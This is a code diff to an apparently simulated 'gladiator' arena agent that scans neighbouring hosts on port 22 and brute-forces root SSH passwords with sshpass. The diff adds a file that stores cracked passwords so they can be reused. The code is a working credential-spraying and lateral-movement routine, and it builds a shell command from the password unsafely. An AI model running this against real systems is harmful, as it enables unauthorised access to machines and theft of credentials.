@@ -12,6 +12,8 @@ import urllib.parse
 ORCHESTRATOR_URL = "http://arena_orchestrator:5000"
 # Hardcoded for now to match Orchestrator's init_grid
 ME = os.environ.get("GLADIATOR_ID", "Glad_A")
+KNOWN_HOSTS_FILE = "/gladiator/data/known_hosts.json"
+
 
 
 def remote_log(msg):
@@ -76,6 +78,25 @@ def get_neighbors():
             neighbors.append(target_ip)
     return neighbors
 
+def load_known_hosts():
+    if os.path.exists(KNOWN_HOSTS_FILE):
+        try:
+            with open(KNOWN_HOSTS_FILE, "r") as f:
+                return json.load(f)
+        except:
+            pass
+    return {}
+
+def save_known_host(ip, password):
+    hosts = load_known_hosts()
+    hosts[ip] = password
+    try:
+        with open(KNOWN_HOSTS_FILE, "w") as f:
+            json.dump(hosts, f)
+    except Exception as e:
+        log(f"Failed to save known host: {e}")
+
+
 def hack_target(target_ip):
     log(f"Checking Port 22 on {target_ip}...")
     # Check if port 22 is open
@@ -85,6 +106,23 @@ def hack_target(target_ip):
         return False
         
     log(f"Port 22 Open on {target_ip}. Brute forcing...")
+    
+    # 1. Check Memory
+    known = load_known_hosts()
+    if target_ip in known:
+        pwd = known[target_ip]
+        log(f"🧠 MEMORY: Remembering password for {target_ip}...")
+        # Try known password
+        cmd = f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 root@{target_ip} 'echo HACKED'"
+        try:
+            res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            if b"HACKED" in res.stdout:
+                log(f"🧠 MEMORY: Auto-cracked {target_ip}!")
+                return True
+            else:
+                 log(f"🧠 MEMORY: Saved password failed. Falling back to brute force.")
+        except Exception:
+            pass
     
     with open("passwords.txt", "r") as f:
         passwords = [line.strip() for line in f]
@@ -100,6 +138,7 @@ def hack_target(target_ip):
             
             if b"HACKED" in out:
                 log(f"PASSWORD CRACKED: {pwd}")
+                save_known_host(target_ip, pwd)
                 return True
             else:
                 # Log the error for the first password only to avoid spam, or if it's a specific error
